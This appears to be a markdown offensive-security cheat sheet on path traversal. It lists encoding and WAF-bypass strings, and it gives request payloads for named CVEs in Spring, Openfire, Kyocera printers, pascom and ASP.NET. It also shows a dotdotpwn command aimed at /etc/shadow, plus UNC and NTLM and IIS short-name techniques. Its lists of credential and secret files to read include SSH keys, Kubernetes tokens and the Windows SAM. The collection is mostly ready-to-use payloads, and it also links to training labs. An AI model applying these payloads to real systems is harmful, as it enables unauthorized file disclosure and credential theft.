# directory traversal

> path traversal, also known as directory traversal, is a type of security vulnerability that occurs when an attacker manipulates variables that reference files with “dot-dot-slash (../)” sequences or similar constructs. this can allow the attacker to access arbitrary files and directories stored on the file system.

## summary

* [tools](#tools)
* [methodology](#methodology)
    * [url encoding](#url-encoding)
    * [double url encoding](#double-url-encoding)
    * [unicode encoding](#unicode-encoding)
    * [overlong utf-8 unicode encoding](#overlong-utf-8-unicode-encoding)
    * [mangled path](#mangled-path)
    * [null bytes](#null-bytes)
    * [reverse proxy url implementation](#reverse-proxy-url-implementation)
* [exploit](#exploit)
    * [unc share](#unc-share)
    * [aspnet cookieless](#aspnet-cookieless)
    * [iis short name](#iis-short-name)
    * [java url protocol](#java-url-protocol)
* [path traversal](#path-traversal)
    * [linux files](#linux-files)
    * [windows files](#windows-files)
* [labs](#labs)
* [references](#references)


## tools

- [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - the directory traversal fuzzer
    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```


## methodology

we can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```


### url encoding

| character | encoded |
| --- | -------- |
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |


**example:** ipconfigure orchid core vms 2.0.5 - local file inclusion

```ps1
{{baseurl}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```


### double url encoding

double url encoding is the process of applying url encoding twice to a string. in url encoding, special characters are replaced with a % followed by their hexadecimal ascii value. double encoding repeats this process on the already encoded string.

| character | encoded |
| --- | -------- |
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |


**example:** spring mvc directory traversal vulnerability (cve-2018-1271)

```ps1
{{baseurl}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{baseurl}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```


### unicode encoding

| character | encoded |
| --- | -------- |
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |


**example**: openfire administration console - authentication bypass (cve-2023-32315)

```js
{{baseurl}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```


### overlong utf-8 unicode encoding

the utf-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the utf-8 specification. this rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.

| character | encoded |
| --- | -------- |
| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` | `%c0%5c`, `%c0%80%5c` |


### mangled path

sometimes you encounter a waf which remove the `../` characters from the strings, just duplicate them.

```powershell
..././
...\.\
```

**example:**: mirasys dvms workstation <=5.12.6

```ps1
{{baseurl}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```


### null bytes

a null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. it is often used as a string terminator in languages like c and c++. in directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.

**example:** homematic ccu3 cve-2019-9726

```js
{{baseurl}}/.%00./.%00./etc/passwd
```

**example:** kyocera printer d-copia253mf cve-2020-23575

```js
{{baseurl}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```


### reverse proxy url implementation

nginx treats `/..;/` as a directory while tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.

```powershell
..;/
```

**example**: pascom cloud phone system cve-2021-45967

a configuration error between nginx and a backend tomcat server leads to a path traversal in the tomcat server, exposing unintended endpoints.

```js
{{baseurl}}/services/pluginscript/..;/..;/..;/getfavicon?host={{interactsh-url}}
```


## exploit

these exploits affect mechanism linked to specific technologies.


### unc share

a unc (universal naming convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. it is commonly used in windows environments but is also supported by other operating systems.

an attacker can inject a **windows** unc share (`\\unc\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.

```powershell
\\localhost\c$\windows\win.ini
```

also the machine might also authenticate on this remote share, thus sending an ntlm exchange.


### asp net cookieless

when cookieless session state is enabled. instead of relying on a cookie to identify the session, asp.net modifies the url by embedding the session id directly into it.

for example, a typical url might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(s(lit3py55t21z5v55vlm25s55))/page.aspx`. the value within `(s(...))` is the session id. 


| .net version   | uri                        |
| -------------- | -------------------------- |
| v1.0, v1.1     | /(xxxxxxxx)/               |
| v2.0+          | /(s(xxxxxxxx))/            |
| v2.0+          | /(a(xxxxxxxx)f(yyyyyyyy))/ |
| v2.0+          | ...                        |


we can use this behavior to bypass filtered urls.

* if your application is in the main folder
    ```ps1
    /(s(x))/
    /(y(z))/
    /(g(aaa-bbb)d(ccc=ddd)e(0-1))/
    /(s(x))/admin/(s(x))/main.aspx
    /(s(x))/b/(s(x))in/navigator.dll
    ```

* if your application is in a subfolder
    ```ps1
    /myapp/(s(x))/
    /admin/(s(x))/main.aspx
    /admin/foobar/(s(x))/../(s(x))/main.aspx
    ```

| cve            | payload                                        |
| -------------- | ---------------------------------------------- |
| cve-2023-36899 | /webform/(s(x))/prot/(s(x))ected/target1.aspx  |
| -              | /webform/(s(x))/b/(s(x))in/target2.aspx        |
| cve-2023-36560 | /webform/pro/(s(x))tected/target1.aspx/(s(x))/ |
| -              | /webform/b/(s(x))in/target2.aspx/(s(x))/       |


### iis short name

the iis short name vulnerability exploits a quirk in microsoft's internet information services (iis) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.

* [irsdl/iis-shortname-scanner](https://github.com/irsdl/iis-shortname-scanner)
    ```ps1
    java -jar ./iis_shortname_scanner.jar 20 8 'https://x.x.x.x/bin::$index_allocation/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://x.x.x.x/myapp/bin::$index_allocation/'
    ```

* [bitquark/shortscan](https://github.com/bitquark/shortscan)
    ```ps1
    shortscan http://example.org/
    ```


### java url protocol

java's url protocol when `new url('')` is used allows the format `url:url`

```powershell
url:file:///etc/passwd
url:http://127.0.0.1:8080
```


## path traversal

### linux files

* operating system and informations
    ```powershell
    /etc/issue
    /etc/group
    /etc/hosts
    /etc/motd
    ```

* processes 
    ```ps1
    /proc/[0-9]*/fd/[0-9]*   # first number is the pid, second is the filedescriptor
    /proc/self/environ
    /proc/version
    /proc/cmdline
    /proc/sched_debug
    /proc/mounts
    ```

* network
    ```ps1
    /proc/net/arp
    /proc/net/route
    /proc/net/tcp
    /proc/net/udp
    ```

* current path
    ```ps1
    /proc/self/cwd/index.php
    /proc/self/cwd/main.py
    ```

* indexing
    ```ps1
    /var/lib/mlocate/mlocate.db
    /var/lib/plocate/plocate.db
    /var/lib/mlocate.db
    ```

* credentials and history
    ```ps1
    /etc/passwd
    /etc/shadow
    /home/$user/.bash_history
    /home/$user/.ssh/id_rsa
    /etc/mysql/my.cnf
    ```

* kubernetes
    ```ps1
    /run/secrets/kubernetes.io/serviceaccount/token
    /run/secrets/kubernetes.io/serviceaccount/namespace
    /run/secrets/kubernetes.io/serviceaccount/certificate
    /var/run/secrets/kubernetes.io/serviceaccount
    ```


### windows files

the files `license.rtf` and `win.ini` are consistently present on modern windows systems, making them a reliable target for testing path traversal vulnerabilities. while their content isn't particularly sensitive or interesting, they serves well as a proof of concept.

```powershell
c:\windows\win.ini
c:\windows\system32\license.rtf
```

a list of files / paths to probe when arbitrary files can be read on a microsoft windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)

```powershell
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```


## labs

* [portswigger - file path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
* [portswigger - file path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
* [portswigger - file path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
* [portswigger - file path traversal, traversal sequences stripped with superfluous url-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
* [portswigger - file path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
* [portswigger - file path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)


## references

- [cookieless aspnet - soroush dalili - march 27, 2023](https://twitter.com/irsdl/status/1640390106312835072)
- [cwe-40: path traversal: '\\unc\share\name\' (windows unc share) - cwe mitre - december 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
- [directory traversal - portswigger - march 30, 2019](https://portswigger.net/web-security/file-path-traversal)
- [directory traversal attack - wikipedia - august 5,  2024](https://en.wikipedia.org/wiki/directory_traversal_attack)
- [ep 057 | proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - thelaluka - november 30, 2023](https://youtu.be/ylzgj28by8u)
- [exploiting blind file reads / path traversal vulnerabilities on microsoft windows operating systems - @evisneffos - 19 june 2018](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
- [nginx may be protecting your applications from traversal attacks without you even knowing - rotem bar - september 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
- [path traversal cheat sheet: windows - @hollygraceful - may 17, 2015](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
- [understand how the asp.net cookieless feature works - microsoft documentation - june 24, 2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))
